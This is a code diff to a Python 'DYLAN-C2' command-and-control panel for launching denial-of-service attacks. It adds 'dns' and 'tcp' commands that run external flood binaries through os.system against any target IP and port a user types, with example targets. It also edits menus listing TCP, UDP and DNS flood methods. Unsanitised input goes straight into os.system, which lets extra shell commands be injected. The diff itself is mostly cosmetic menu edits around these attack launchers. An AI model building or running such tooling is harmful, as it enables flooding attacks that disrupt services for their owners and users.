@@ -5,6 +5,7 @@
 
 import socket
 import os
+import requests
 import random
 import getpass
 import time
@@ -90,13 +91,7 @@ def tools():
     clear()
     si()
     print(f'''
-                         ########  #######   #######  ##        ######  
-                            ##    ##     ## ##     ## ##       ##    ## 
-                            ##    ##     ## ##     ## ##       ##       
-                            ##    ##     ## ##     ## ##        ######  
-                            ##    ##     ## ##     ## ##             ## 
-                            ##    ##     ## ##     ## ##       ##    ## 
-                            ##     #######   #######  ########  ######  
+                         
         
                                 \x1b[38;2;0;212;14m╔═══════════════╗
                                 \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
@@ -232,17 +227,17 @@ def layer4():
     print(f'''
                                          
                            \x1b[38;5;140m╔════════════════════════════════════════════════╗
-                           \x1b[38;5;140m║                 DYLAN-C2 LAYER4                ║
+                           \x1b[38;5;140m║                 DYLAN-C2 LAYER4                   ║
                            \x1b[38;5;140m╚════════════════════════════════════════════════╝
                           \x1b[38;5;140m╭──────────────────────────────────────────────────╮
-                          \x1b[38;5;140m│ \x1b[38;5;120m❯ .TCP            \x1b[38;5;140m┃ TCP BRUTAL                   │
+                          \x1b[38;5;140m│ \x1b[38;5;120m❯ .TCP            \x1b[38;5;140m┃ TCP BRUTAL                     │
                           \x1b[38;5;140m│──────────────────────────────────────────────────│
-                          \x1b[38;5;140m│ \x1b[38;5;120m❯ .UDP            \x1b[38;5;140m┃ BASIC UDP FLOOD              │
+                          \x1b[38;5;140m│ \x1b[38;5;120m❯ .UDP            \x1b[38;5;140m┃ BASIC UDP FLOOD                │
                           \x1b[38;5;140m│──────────────────────────────────────────────────│                   
-                          \x1b[38;5;140m│ \x1b[38;5;120m❯ .UDP2           \x1b[38;5;140m┃ HIGH UDP FLOOD               │
+                          \x1b[38;5;140m│ \x1b[38;5;120m❯ .UDP2           \x1b[38;5;140m┃ HIGH UDP FLOOD                 │
                           \x1b[38;5;140m│──────────────────────────────────────────────────│
-                          \x1b[38;5;140m│ \x1b[38;5;120m❯ .DNS            \x1b[38;5;140m┃ DNS FLOOD                    │
-                          \x1b[38;5;140m╰──────────────────────────────────────────────────╯
+                          \x1b[38;5;140m│ \x1b[38;5;120m❯ .DNS            \x1b[38;5;140m┃ DNS FLOOD                      │
+                          \x1b[38;5;140m╰───────────────────────────────────────────────────╯
 ''')
 
 def amp_games():
@@ -318,6 +313,24 @@ def main():
             except IndexError:
                 print('Usage: udpbypass <ip> <port>')
                 print('Example: udpbypass 1.1.1.1 80')
+                
+        elif "dns" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./DNS {ip} {port} {listfile} {threads} {time}')
+            except IndexError:
+                print('Usage: dns <ip> <port> <flood> <threads> <time>')
+                print('Example: dns 1.1.1.1 80 1 120 60')             
+
+        elif "tcp" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./TCPBYPASS {ip} {port} {threads} {pps} {time}')
+            except IndexError:
+                print('Usage: tcp <ip> <port> <threads> <pps> <time>')
+                print('Example: tcp 1.1.1.1 80 120 -1 60')                
 
         elif "stdv2" in cnc:
             try:
@@ -839,14 +852,14 @@ def main():
                        | |  | | |____| |____| |     
                        |_|  |_|______|______|_| 
                      
-                       \x1b[38;5;51m[\x1b[38;5;196m9\x1b[38;5;51m] LAYER7  ► SHOW LAYER7 METHODS
-                       \x1b[38;5;51m[\x1b[38;5;196m9\x1b[38;5;51m] LAYER4  ► SHOW LAYER4 METHODS
-                       \x1b[38;5;51m[\x1b[38;5;196m9\x1b[38;5;51m] AMP     ► SHOW AMP METHODS
-                       \x1b[38;5;51m[\x1b[38;5;196m9\x1b[38;5;51m] SPECIAL ► SHOW SPECIAL METHODS
-                       \x1b[38;5;51m[\x1b[38;5;196m9\x1b[38;5;51m] BANNERS ► SHOW BANNERS
-                       \x1b[38;5;51m[\x1b[38;5;196m9\x1b[38;5;51m] BATAS   ► RULES PANEL
-                       \x1b[38;5;51m[\x1b[38;5;196m9\x1b[38;5;51m] PORTS   ► SHOW ALL PORTS
-                       \x1b[38;5;51m[\x1b[38;5;196m9\x1b[38;5;51m] TOOLS   ► SHOW TOOLS
+                       \x1b[38;5;51m[\x1b[38;5;196m1\x1b[38;5;51m] LAYER7  ► SHOW LAYER7 METHODS
+                       \x1b[38;5;51m[\x1b[38;5;196m2\x1b[38;5;51m] LAYER4  ► SHOW LAYER4 METHODS
+                       \x1b[38;5;51m[\x1b[38;5;196m3\x1b[38;5;51m] AMP     ► SHOW AMP METHODS
+                       \x1b[38;5;51m[\x1b[38;5;196m4\x1b[38;5;51m] SPECIAL ► SHOW SPECIAL METHODS
+                       \x1b[38;5;51m[\x1b[38;5;196m5\x1b[38;5;51m] BANNERS ► SHOW BANNERS
+                       \x1b[38;5;51m[\x1b[38;5;196m6\x1b[38;5;51m] BATAS   ► RULES PANEL
+                       \x1b[38;5;51m[\x1b[38;5;196m7\x1b[38;5;51m] PORTS   ► SHOW ALL PORTS
+                       \x1b[38;5;51m[\x1b[38;5;196m8\x1b[38;5;51m] TOOLS   ► SHOW TOOLS
                        \x1b[38;5;51m[\x1b[38;5;196m9\x1b[38;5;51m] LINIS   ► CLEAR TERMINAL
             ''')
 
